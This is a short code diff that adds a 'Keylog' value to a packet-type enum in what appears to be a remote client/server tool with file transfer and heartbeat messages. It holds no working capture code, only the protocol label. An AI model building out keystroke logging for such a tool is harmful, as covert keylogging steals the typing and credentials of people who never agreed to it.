@@ -21,8 +21,9 @@ enum class PacketType
 	ClientFileTransfer_EndOfFile, //Sent for when file transfer is complete
 	ClientFileTransferByteBuffer, //Sent before sending a byte buffer for file transfer
 	ClientFileTransferRequestNextBuffer, //Sent to request the next buffer for file
-	//Check if clients are still connected periodically
 	Update,
+	Keylog,
+	//Check if clients are still connected periodically
 	Heartbeat
 };
 
